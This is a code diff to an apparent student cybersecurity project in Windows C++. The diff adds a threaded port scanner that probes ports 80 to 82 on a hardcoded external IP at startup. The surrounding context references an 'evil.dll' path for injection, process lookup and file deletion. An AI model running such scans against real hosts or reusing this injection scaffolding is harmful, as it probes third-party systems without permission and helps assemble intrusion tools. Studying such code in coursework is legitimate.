@@ -13,12 +13,71 @@
 #include <sstream>
 #include <winsock.h>
 #include <tlhelp32.h>
+#include <mutex>
+#include <thread>
+#include <queue>
 using std::ostringstream;
 using std::ends;
 #pragma comment(lib, "ws2_32.lib")
 
 char evilDLL[] = "D:\\Cyber\\YB_CYBER\\project\\FinalProject\\ExeFiles\\ExeFiles\\evil.dll";
 unsigned int evilLen = sizeof(evilDLL) + 1;
+
+
+std::queue<int> port_queue;
+std::mutex mut;
+
+DWORD port_scanner(int port, char* ip) {
+
+    WSADATA wsa;
+
+    printf("\nInitialising Winsock...");
+    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
+    {
+        printf("Failed. Error Code : %d", WSAGetLastError());
+        return 1;
+    }
+
+    printf("Initialised.\n");
+
+    SOCKET s;
+    struct sockaddr_in sock;
+
+    //Create a socket
+    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
+    {
+        printf("Could not create socket : %d", WSAGetLastError());
+    }
+
+    printf("Socket created.\n");
+
+
+    sock.sin_addr.s_addr = inet_addr(ip);
+    sock.sin_family = AF_INET;
+    sock.sin_port = htons(port);
+
+    //Connect to remote server
+    int iResult = connect(s, (struct sockaddr*)&sock, sizeof(sock));
+    if (iResult == SOCKET_ERROR)
+    {
+        std::cout << "No success :( in connecting to port " << port << std::endl;
+    }
+    else {
+        std::cout << "Succcess :) Connected to port " << port << std::endl;
+    }
+    return 0;
+}
+
+void run() {
+
+    //mut.lock();
+    while (!port_queue.empty()) {
+        int port = port_queue.front();
+        port_scanner(port, (char*)"142.250.186.68");
+        port_queue.pop();
+    }
+    //mut.unlock();
+}
 
 DWORD FindProcessId(const std::wstring& processName)
 {
@@ -49,7 +108,6 @@ DWORD FindProcessId(const std::wstring& processName)
     CloseHandle(processesSnapshot);
     return 0;
 }
-
 int CreateSocket()
 {
     WSADATA wsa;
@@ -173,7 +231,13 @@ int main()
     DWORD BufferSize = 8192;
     RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "SystemRoot", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
 
+    for (size_t i = 80; i <= 82; i++)
+    {
+        port_queue.push(i);
+    }
+    run();
     int zero = CreateSocket();
+
     if (DeleteFileA("D:\\Cyber\\YB_CYBER\\project\\FinalProject\\De_Bug\\De_Bug\\hello.txt") != 0)
         printf("success in deleting hello.txt");
 
